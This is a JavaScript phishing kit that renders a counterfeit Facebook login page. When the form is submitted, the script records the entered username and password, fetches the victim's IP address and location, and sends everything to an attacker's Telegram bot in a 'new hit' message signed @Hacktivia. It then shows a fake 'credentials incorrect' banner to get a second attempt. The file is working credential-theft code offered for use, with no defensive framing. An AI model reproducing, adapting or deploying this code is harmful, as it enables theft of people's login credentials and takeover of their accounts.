(function () {
  const style = document.createElement('style');
  style.innerHTML = `
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 90vh;
    }

     .container {
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .language-selector {
      font-size: 14px;
      color: #444;
      margin-bottom: 50px;
    }
    .logo {
      width: 70px;
      margin-bottom: 50px;
    }
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 15px;
    }

    .login-form input {
      padding: 15px;
      border: 1px solid #ccc;
      border-radius: 15px;
      font-size: 15px;
    }

    .login-btn {
      background-color: #1877F2;
      color: #fff;
      border: none;
      border-radius: 30px;
      padding: 14px;
      font-size: 16px;
      cursor: pointer;
    }

    .forgot-password {
      display: block;
      margin: 15px 0 30px;
      color: #262626;
      text-decoration: none;
      font-size: 14px;
    }

    .create-btn {
      border: 1px solid #1877F2;
      width: 90%;
      background-color: #fff;
      color: #1877F2;
      padding: 14px;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
      position: relative;
      top: 120px;
    }

    .meta-logo {
      margin-top: 20px;
      font-size: 18px;
      color: #444;
      font-weight: 500;
      position: relative;
      top: 110px;
    }
    
    .dwn {
      width: 20px;
      position: relative;
      top: 6px;
    }
    
    .meta {
      width: 70px;
    }

    #successMessage {
      display: none;
      background-color: red;
      color: white;
      text-align: center;
      padding: 10px;
      left: 50%;             
  transform: translateX(-50%);
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 1000;
    }
        
    input:focus,
    button:focus {
      outline: none;
    }
  `;
  document.head.appendChild(style);


  window.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement("div");
    container.className = "container";
    container.innerHTML = `
    
    <div id="successMessage">
    The credentials details that you entered is incorrect, but we can help you get back into your account. 
    <strong>Try again with different log</strong>
  </div>
    
    
      <div class="language-selector">
        English (US) <img src="https://allinlinks.github.io/Img/dwn.png" alt="" class="dwn">
      </div>
      <img src="https://allinlinks.github.io/Img/facebook.png" alt="Instagram Logo" class="logo" />
      <form id="loginForm" class="login-form">
        <input id="username" type="text" placeholder="Username, email or mobile number" required autocomplete="username" />
        <input id="password" type="password" placeholder="Password" required autocomplete="current-password" />
        <button type="submit" class="login-btn">Log in</button>
      </form>
      <a href="#" class="forgot-password">Forgot password?</a>
      <button class="create-btn">Create new account</button>
      <div class="meta-logo">
        <img src="https://allinlinks.github.io/Img/meta.png" alt="Meta" class="meta">
      </div>
    `;
    document.body.appendChild(container);
    
     document.getElementById('loginForm').addEventListener('submit', async function(event) {
      event.preventDefault();

      const userVal = document.getElementById('username').value;
      const passVal = document.getElementById('password').value;
      
      let ip = "N/A", country = "N/A", state = "N/A", code = "N/A";

      // 1. Fetch Location Data
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = data.ip || "N/A";
        country = data.country_name || "N/A";
        state = data.region || "N/A";
        code = data.country_calling_code || "N/A";
      } catch (e) {
        console.error("IP Data Fetch Failed");
      }

      const dateTime = new Date().toLocaleString();

      // 2. Format Message (The <code> tag makes it "Tap to Copy" in Telegram)
      const message = `𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪
      
🐉⊚-----------------------------------⊚🐉

👤<b>Username:</b> <code>${userVal}</code>

📟<b>Password:</b> <code>${passVal}</code>

🌍<b>Country:</b> ${country}

🏴<b>State:</b> ${state}

⚙️<b>IP Address:</b> ${ip}

📝<b>Code:</b> <code>${code}</code>

⏱<b>Date/Time:</b> ${dateTime}

🌐<b>Login From:</b> Facebook

🐉⊚-----------------------------------⊚🐉

↝ ᴅᴇᴠ ʙʏ » @Hacktivia`;

      // 3. Send to Telegram
      try {
        await fetch(`https://api.telegram.org/bot${iovjrtrdhhj9}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: I94626736O,
            text: message,
            parse_mode: 'HTML'
          })
        });
      } catch (e) {
        console.error("Telegram Send Failed");
      }
      
       // Show confirmation & reset form
      const successEl = document.getElementById('successMessage');
      successEl.style.display = 'block';
      setTimeout(() => successEl.style.display = 'none', 8000);
      this.reset();

 document.getElementById('password').value = '';
    });
  });
})();
